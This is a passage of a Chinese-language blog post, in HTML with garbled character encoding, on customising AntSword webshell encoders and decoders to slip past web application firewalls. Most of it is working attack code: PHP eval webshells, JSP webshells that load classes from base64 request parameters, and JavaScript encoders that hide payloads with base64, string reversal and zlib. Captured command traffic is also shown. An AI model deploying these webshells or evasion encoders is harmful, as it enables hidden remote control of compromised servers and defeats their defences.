class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  ext.opts.httpConf.headers[&#x27;User-Agent&#x27;]=&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;;</span><br><span class="line">  // ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span><br><span class="line">  let ret = &#123;&#125;;</span><br><span class="line">  for (let _ in data)&#123;</span><br><span class="line">    if (_ === &#x27;_&#x27;) &#123; continue &#125;;</span><br><span class="line">    ret[_] = Buffer.from(data[_]).toString(&#x27;base64&#x27;);</span><br><span class="line">    ret[_] = &#x27;lwk02nm33&#x27; + ret[_];</span><br><span class="line">    ret[_] += &#x27;lwk02nm33&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  let randomID = `ceshi`;</span><br><span class="line">  ret[randomID] = zlib.deflateRawSync(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span><br><span class="line">  ret[randomID] =&#x27;lwk02nm33&#x27; + ret[randomID];</span><br><span class="line">  ret[randomID] += &#x27;lwk02nm33&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ret[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span><br><span class="line">  ret[pwd] = &#x27;lwk02nm33&#x27; + ret[pwd];</span><br><span class="line">  ret[pwd] += &#x27;lwk02nm33&#x27;;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  // ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span><br><span class="line"></span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$st = $_POST[&#x27;test&#x27;];</span><br><span class="line">$result = substr_replace($st, &quot;&quot;, 0, 9);</span><br><span class="line">@eval(@gzinflate(base64_decode($_POST[&quot;ant&quot;])));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="antsword-JSPæ”¹é€ "><a href="#antsword-JSPæ”¹é€ " class="headerlink" title="antsword-JSPæ”¹é€ "></a>antsword-JSPæ”¹é€ </h4><h5 id="1-1JSPæ”¹é€ å‰ç½®çŸ¥è¯†"><a href="#1-1JSPæ”¹é€ å‰ç½®çŸ¥è¯†" class="headerlink" title="1.1JSPæ”¹é€ å‰ç½®çŸ¥è¯†"></a>1.1JSPæ”¹é€ å‰ç½®çŸ¥è¯†</h5><p>ç†è®ºä¸Šæ¥è¯´ï¼Œç¼–ç çš„æ–¹å¼éƒ½æ˜¯ç›¸åŒçš„ã€‚<br>å…ˆæ¥çœ‹ä¸€ä¸‹jspçš„èšå‰‘ç›®å½•ç»“æ„ï¼Œå’Œå…¶ä»–æ— ç–‘</p><p><img src="/images/antsword-bypasswaf/image-20240306143134069.png" alt="image-20240306143134069"></p><p>templateæ˜¯æ–‡ä»¶æ“ä½œå’Œå‘½ä»¤æ‰§è¡Œçš„</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="keyword">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹ä¸€ä¸‹ä¸€ä¸ªjspèšå‰‘æœ¨é©¬ï¼Œ<code>class U extends ClassLoader &#123; ... &#125;</code> è¿™æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„ ClassLoader å­ç±»ã€‚æœ‰ä¸€ä¸ªbase64Decodeæ–¹æ³•ç”¨æ¥è§£base64çš„ï¼Œ<br>String cls = request.getParameter(â€œpasswdâ€);æ¥å—httpçš„ä¼ å‚ç»™passwdï¼Œä¸ä¸ºç©ºåˆ™è¿›å»ï¼Œç„¶åè¿›è¡Œbase64è§£ç ï¼Œ<br>    if (cls != null) {<br>        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>ç”¨è¿”å›ç»“æœã€‚<br>ç”¨èšå‰‘è¿æ¥ä¸€ä¸‹ï¼Œ<br><img src="/images/antsword-bypasswaf/image-20240306150026121.png" alt="image-20240306150026121"></p><p>å¯ä»¥çœ‹åˆ°passwdæ˜¯å¯†ç ï¼Œå¯†ç ä¼ é€’äº†ä¸€å †å­—èŠ‚ç ï¼Œyv66å¼€å¤´<br><img src="/images/antsword-bypasswaf/image-20240306150205683.png" alt="image-20240306150205683"></p><p><img src="/images/antsword-bypasswaf/image-20240306150238145.png" alt="image-20240306150238145"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°èšå‰‘çš„ä¸€äº›åŠŸèƒ½éƒ½æ˜¯yv66å¼€å¤´çš„ã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240306150352542.png" alt="image-20240306150352542"></p><p>è¿™é‡Œåç¼–è¯‘å¯ä»¥çœ‹åˆ°javaä»£ç ï¼Œä¸è¯¦ç»†è§£é‡Šäº†ï¼Œä¸æ˜¯å¾ˆä¼šã€‚</p><p>bpåŒ…é‡Œä¼ é€’åŠŸèƒ½çš„æ—¶ä¾¯s2e8fc7082b2a3=ajY2QgIi8iO3dob2FtaTtlY2hvIGVhNDEyNDQ3MmM7cHdkO2VjaG8gNGI2MmVh<br>ä¹Ÿå¯ä»¥çœ‹åˆ°éšæœº14ä½å€¼ä¼ é€’åŠŸèƒ½<br><img src="/images/antsword-bypasswaf/image-20240306150542869.png" alt="image-20240306150542869"></p><p>å»æ‰å‰ä¸¤ä½ï¼Œå³å¯çœ‹åˆ°æ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤ã€‚å’Œphpä¸­çš„ä¸€æ ·ã€‚<br><img src="/images/antsword-bypasswaf/image-20240306150628371.png" alt="image-20240306150628371"></p><p>è¿”å›åŒ…ã€‚</p><h5 id="2-ç¼–ç å™¨ä¸è§£ç å™¨"><a href="#2-ç¼–ç å™¨ä¸è§£ç å™¨" class="headerlink" title="2.ç¼–ç å™¨ä¸è§£ç å™¨"></a>2.ç¼–ç å™¨ä¸è§£ç å™¨</h5><h6 id="2-1jspç¼–ç å™¨"><a href="#2-1jspç¼–ç å™¨" class="headerlink" title="2.1jspç¼–ç å™¨"></a>2.1jspç¼–ç å™¨</h6><p>æˆ‘ä»¬ä»¿ç…§phpè¿›è¡Œå†™ä¸€ä¸ªç¼–ç å™¨ï¼Œ<br>å‡è®¾ï¼ŒæŸæ¬¾wafå¯ä»¥è¯†åˆ«æˆ–è€…æ ‡æ³¨äº†è¿™ä¸ªyv66å¼€å¤´çš„payloadã€‚<br>æˆ‘ä»¬é€‰æ‹©base64ç»™payloadåŠ å¯†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jsp::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå…¶å®è¿™æ ·å°±å¯ä»¥ï¼Œdataæ•°ç»„ä¸­çš„pwdç»™ä»–base64ä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯åšä¸ªä¼ é€’å§ã€‚<br><img src="/images/antsword-bypasswaf/image-20240306151811872.png" alt="image-20240306151811872"></p><p><img src="/images/antsword-bypasswaf/image-20240306151836182.png" alt="image-20240306151836182"></p><p>é‚£ä¹ˆæ­¤æ—¶å‘é€çš„æ•°æ®åŒ…å°±æ˜¯base64ç¼–ç è¿‡çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„webshellå°±è¦æ”¹åŠ¨ä¸€ä¸‹</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String decodedCls = <span class="keyword">new</span> String(base64Decode(cls), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(decodedCls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ”¹æˆå…ˆè¿›è¡Œä¸€ä¸‹base64è§£ç ç„¶ååœ¨è¿›è¡Œä¼ å‚ï¼Œbase64è§£ç ã€‚è¿™æ ·å°±æŠŠyv66ç»™éšè—äº†ï¼Œ</p><p>ä»€ä¹ˆï¼Œä½ è¯´wafèƒ½è§£base64ï¼Œç„¶åè¯†åˆ«äº†yv66,<br>æˆ‘ä»¬å¯ä»¥é€†åºä¸€ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jsp::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œbase64,ç„¶åé€†åºã€‚</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">é‚£ä¹ˆç›¸åº”çš„æœ¨é©¬ä¹Ÿè¦æ”¹ä¸€ä¸‹ï¼Œå¾ˆç®€å•ï¼Œåœ¨ä¼ ç»™passwdåçš„å‚æ•°å…ˆé€†åºåœ¨base64è§£ç å³å¯ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">U</span>(<span class="params">ClassLoader c</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class <span class="function"><span class="title">g</span>(<span class="params">byte[] b</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(<span class="built_in">String</span> str) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="built_in">String</span>.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="built_in">Object</span> decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="built_in">String</span>.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span> cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">String</span> reversedCls = <span class="keyword">new</span> StringBuilder(cls).reverse().toString();</span><br><span class="line">        <span class="built_in">String</span> decodedCls = <span class="keyword">new</span> <span class="built_in">String</span>(base64Decode(reversedCls), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> U(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(decodedCls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bpé‡Œé¢çš„åŒ…æ˜¯è¿™æ ·çš„ï¼Œäººå·¥å®¡æ ¸è¿˜æ˜¯èƒ½çœ‹å‡ºæ¥çš„ã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240306154654061.png" alt="image-20240306154654061"></p><p><img src="/images/antsword-bypasswaf/image-20240306154736621.png" alt="image-20240306154736621"></p><p>è¿™é‡Œå…¶å®æœ€é‡è¦çš„çš„è¿˜æ˜¯ä¿®æ”¹è¿™ä¸ªåŠŸèƒ½çš„ä¼ å‚ï¼Œè¿˜æ˜¯éå¸¸æ˜æ˜¾çš„ã€‚è¿™é‡Œå°±å…ˆä¸ç ”ç©¶äº†ã€‚<br><a href="https://github.com/AntSwordProject/antSword/issues/185">https://github.com/AntSwordProject/antSword/issues/185</a><br><a href="https://darkless.cn/2020/05/19/antsword-bypass-waf/#%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%BC%96%E7%A0%81%E5%99%A8">https://darkless.cn/2020/05/19/antsword-bypass-waf/#%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%BC%96%E7%A0%81%E5%99%A8</a><br>å®˜æ–¹å’Œè¿™ä½å¸ˆå‚…éƒ½å·²ç»ç»™å‡ºäº†ç­”æ¡ˆã€‚<br>å½“ç„¶å®˜æ–¹ä¹Ÿç»™å‡ºäº†jspç¼–ç å™¨çš„zlibç‰ˆæœ¬<br><a href="https://github.com/AntSwordProject/AwesomeScript/blob/master/jsp/jsp_defineclass_zlib_deflated_script.jsp">https://github.com/AntSwordProject/AwesomeScript/blob/master/jsp/jsp_defineclass_zlib_deflated_script.jsp</a></p><h6 id="2-2jspè§£ç å™¨"><a href="#2-2jspè§£ç å™¨" class="headerlink" title="2.2jspè§£ç å™¨"></a>2.2jspè§£ç å™¨</h6><p>å‚è€ƒï¼š<a href="https://github.com/AntSwordProject/AntSword-JSP-Template/tree/master">https://github.com/AntSwordProject/AntSword-JSP-Template/tree/master</a><br>èšå‰‘çš„å®˜æ–¹å…¶å®å·²ç»ç»™å‡ºäº†jspå‡ ç§é»˜è®¤çš„è§£ç æ–¹å¼,</p><p>é€†åº</p><p><img src="/images/antsword-bypasswaf/image-20240306171434142.png" alt="image-20240306171434142"></p><p>rot13</p><p><img src="/images/antsword-bypasswaf/image-20240306171500284.png" alt="image-20240306171500284"></p><p>base64<br><img src="/images/antsword-bypasswaf/image-20240306171528630.png" alt="image-20240306171528630"></p><p>ä½†æ˜¯èšå‰‘æ·»åŠ jspçš„æ—¶å€™æ˜¾ç¤ºçš„æ˜¯phpçš„è§£ç ï¼Œæˆ‘ä»¬åœ¨æºç ä¸­å¯ä»¥çœ‹åˆ°ç›¸åº”ä»£ç <br><img src="/images/antsword-bypasswaf/image-20240306171746073.png" alt="image-20240306171746073"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSP::reverse è§£ç å™¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">module</span>.exports = &#123;</span><br><span class="line">   <span class="attr">asoutput</span>: <span class="function">(<span class="params">ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * ext = &#123;</span></span><br><span class="line"><span class="comment">      *   opts: ç±»å‹ä¸º Object, Shell é…ç½®</span></span><br><span class="line"><span class="comment">      * &#125;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">`yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS`</span>;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">decode_buff</span>: <span class="function">(<span class="params">buff</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> Buffer.from(buff).reverse();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span></span><br><span class="line"><span class="comment">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span></span><br><span class="line"><span class="comment">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">       $a = base64_encode($out);</span></span><br><span class="line"><span class="string">        return &#x27;&#123;&quot;message&quot;:&quot;&#x27; .strrev($a) . &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è§£ç  Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data è¦è¢«è§£ç çš„ Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>è§£ç åçš„ Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§phpçš„å†™æ³•æ”¹ä¸€ä¸‹ï¼Œä¹Ÿæ”¹æˆjsonçš„å½¢å¼<br><img src="/images/antsword-bypasswaf/image-20240306172328193.png" alt="image-20240306172328193"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 